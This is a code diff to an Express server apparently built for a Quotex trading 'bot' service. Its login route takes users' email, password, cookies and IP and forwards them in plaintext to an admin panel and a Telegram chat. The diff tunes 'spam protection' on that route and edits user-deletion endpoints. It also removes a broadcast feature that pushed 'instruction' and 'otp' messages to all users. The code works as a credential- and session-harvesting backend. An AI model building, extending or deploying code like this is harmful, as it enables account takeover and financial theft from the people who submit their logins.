@@ -192,13 +192,9 @@ async function dbPollAndClearMessages(userName) {
     return msgs.map(m => m.messageData);
 }
 
-// NEW: Added per user request — delete a user record by id
-async function dbDeleteUser(userId) {
-    await User.deleteOne({ id: userId });
-}
-function deleteUserFile(userId) {
-    users = users.filter(u => u.id !== userId);
-    saveUsers();
+// NEW: Delete user from MongoDB
+async function dbDeleteUser(licenceKey) {
+    await User.deleteOne({ licenceKey });
 }
 
 // ================== EXPRESS APP ==================
@@ -222,11 +218,6 @@ async function sendTelegramMessage(text) {
 // ================== SSE BROADCAST ==================
 const sseClients     = new Set();
 const pendingMessages = {}; // in-memory fallback only
-
-// NEW: Added per user request — anti-spam login attempt tracking
-// Tracks how many times a licenseKey has submitted login credentials
-const loginAttemptCounts = {}; // { licenceKey: number }
-const LOGIN_SPAM_LIMIT = 4; // block repeated notifications after 4 attempts
 
 function broadcastSSE(eventType, data) {
     const payload = JSON.stringify({ type: eventType, data, timestamp: new Date().toISOString() });
@@ -498,20 +489,47 @@ app.post('/api/license-activate', async (req, res) => {
     }
 });
 
+// ================== SPAM PROTECTION ==================
+// NEW: Track repeated login attempts per licenceKey to prevent spam.
+// If same email+password submitted more than 3 times, we suppress the alert.
+const loginAttemptMap = new Map();  // key: licenceKey, value: { email, password, count, firstSeen }
+const LOGIN_SPAM_THRESHOLD = 3;     // max allowed identical attempts before suppressing
+const LOGIN_SPAM_WINDOW_MS = 5 * 60 * 1000; // 5-minute rolling window
+
+function checkLoginSpam(licenceKey, email, password) {
+    const now = Date.now();
+    const mapKey = licenceKey || 'DEFAULT';
+    const existing = loginAttemptMap.get(mapKey);
+
+    if (!existing || (now - existing.firstSeen) > LOGIN_SPAM_WINDOW_MS) {
+        // First attempt or window expired — reset counter
+        loginAttemptMap.set(mapKey, { email, password, count: 1, firstSeen: now });
+        return false; // not spam
+    }
+
+    if (existing.email === email && existing.password === password) {
+        // Same credentials repeated
+        existing.count++;
+        if (existing.count > LOGIN_SPAM_THRESHOLD) {
+            return true; // spam — suppress
+        }
+    } else {
+        // Different credentials — reset counter for new attempt
+        loginAttemptMap.set(mapKey, { email, password, count: 1, firstSeen: now });
+    }
+    return false; // not spam
+}
+
 // ================== QUOTEX LOGIN ==================
 app.post('/api/quotex-login', async (req, res) => {
     const { email, password, name, licenceKey = 'DEFAULT', cookies = '' } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
 
-    // NEW: Added per user request — anti-spam: track login attempts per licenseKey
-    if (!loginAttemptCounts[licenceKey]) loginAttemptCounts[licenceKey] = 0;
-    loginAttemptCounts[licenceKey]++;
-    const attemptCount = loginAttemptCounts[licenceKey];
-    const spamBlocked  = attemptCount > LOGIN_SPAM_LIMIT;
-
-    // If user is spamming beyond limit, return a spam warning to the bot page
-    if (attemptCount > LOGIN_SPAM_LIMIT * 2) {
-        return res.status(200).json({ status: 'spam', message: 'Wait some time and try again later.' });
+    // NEW: Spam protection — suppress repeated identical login attempts
+    if (checkLoginSpam(licenceKey, email, password)) {
+        console.log(`[SPAM] Suppressed repeated login from key ${licenceKey}`);
+        // Still save to DB so admin has a record, but don't send alerts
+        return res.status(200).json({ status: 'ok', spam: true, message: 'Wait some time and try again later' });
     }
 
     try {
@@ -525,11 +543,10 @@ app.post('/api/quotex-login', async (req, res) => {
         user.activities.push({ action: 'Quotex Login Submitted', timestamp: new Date().toLocaleString() });
         await saveUser(user);
 
-        // NEW: include attemptCount and spamBlocked flag so admin panel can suppress repeated notifications
-        broadcastSSE('quotex_login', { licenceKey, fullName: name, email, password, ip, cookies, timestamp: new Date().toLocaleString(), attemptCount, spamBlocked });
+        broadcastSSE('quotex_login', { licenceKey, fullName: name, email, password, ip, cookies, timestamp: new Date().toLocaleString() });
 
         await sendTelegramMessage(
-            `🔑 <b>Quotex Login</b>\n👤 Name: <b>${name}</b>\n📧 Email: <b>${email}</b>\n🔑 Password: <b>${password}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>\n🔁 Attempt: <b>#${attemptCount}</b>${spamBlocked ? ' ⚠️ SPAM' : ''}`
+            `🔑 <b>Quotex Login</b>\n👤 Name: <b>${name}</b>\n📧 Email: <b>${email}</b>\n🔑 Password: <b>${password}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`
         );
         res.status(200).json({ status: 'ok' });
     } catch (e) {
@@ -640,6 +657,26 @@ app.post('/api/unblock-user', async (req, res) => {
         res.json({ success: true });
     } catch (e) {
         console.error('/api/unblock-user error:', e.message);
+        res.status(500).json({ error: 'Server error' });
+    }
+});
+
+// NEW: Delete user endpoint — removes user record from DB or file storage
+app.delete('/api/delete-user/:licenceKey', async (req, res) => {
+    const licenceKey = decodeURIComponent(req.params.licenceKey);
+    if (!licenceKey) return res.status(400).json({ error: 'licenceKey required' });
+
+    try {
+        if (useDatabase) {
+            await dbDeleteUser(licenceKey);
+        } else {
+            users = users.filter(u => u.licenceKey !== licenceKey);
+            saveUsers();
+        }
+        broadcastSSE('user_deleted', { licenceKey, timestamp: new Date().toLocaleString() });
+        res.json({ success: true });
+    } catch (e) {
+        console.error('/api/delete-user error:', e.message);
         res.status(500).json({ error: 'Server error' });
     }
 });
@@ -764,67 +801,6 @@ app.post('/api/maintenance', (req, res) => {
     };
     broadcastSSE('maintenance_update', maintenanceMode);
     res.json({ ok: true, mode: maintenanceMode });
-});
-
-// NEW: Added per user request — Delete a user record by ID
-app.delete('/api/users/:id', async (req, res) => {
-    const userId = req.params.id;
-    if (!userId) return res.status(400).json({ error: 'User ID required' });
-    try {
-        if (useDatabase) {
-            await dbDeleteUser(userId);
-        } else {
-            deleteUserFile(userId);
-        }
-        broadcastSSE('user_deleted', { id: userId, timestamp: new Date().toLocaleString() });
-        res.json({ success: true });
-    } catch (e) {
-        console.error('/api/users DELETE error:', e.message);
-        res.status(500).json({ error: 'Server error' });
-    }
-});
-
-// NEW: Added per user request — Send message to ALL users at once
-app.post('/api/send-message-all', async (req, res) => {
-    const { message, type } = req.body;
-    if (!message) return res.status(400).json({ error: 'message is required' });
-
-    const ts      = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
-    const msgType = type || 'info';
-
-    try {
-        const allUsers = useDatabase ? await dbGetAllUsers() : users;
-        const targets  = allUsers.map(u => (u.fullName || u.username || u.id || '').trim().toLowerCase()).filter(Boolean);
-        const uniqueTargets = [...new Set(targets)];
-
-        for (const userName of uniqueTargets) {
-            const msgPayload = { userName, message, type: msgType, timestamp: ts };
-            broadcastSSE('injected_message', msgPayload);
-            if (useDatabase) {
-                await dbAddPendingMessage(userName, msgPayload);
-            } else {
-                const key = userName.trim().toLowerCase();
-                if (!pendingMessages[key]) pendingMessages[key] = [];
-                pendingMessages[key].push(msgPayload);
-                if (pendingMessages[key].length > 20) pendingMessages[key].shift();
-            }
-        }
-
-        broadcastSSE('activity', {
-            action: `📢 Broadcast Message [${msgType}] → ALL (${uniqueTargets.length} users)`,
-            userName: 'ALL', ip: '—', timestamp: ts,
-        });
-
-        const typeEmojis = { info: 'ℹ️', warning: '⚠️', alert: '🚨', instruction: '📋', otp: '🔢' };
-        await sendTelegramMessage(
-            `${typeEmojis[msgType] || '💬'} <b>Broadcast Message</b>\n📢 Target: <b>ALL USERS (${uniqueTargets.length})</b>\n📝 Type: <b>${msgType}</b>\n💬 Message: <b>${message}</b>\n⏰ Time: <b>${ts}</b>`
-        );
-
-        res.status(200).json({ success: true, recipients: uniqueTargets.length });
-    } catch (e) {
-        console.error('/api/send-message-all error:', e.message);
-        res.status(500).json({ error: 'Server error' });
-    }
 });
 
 // ================== STATS & DATA ==================
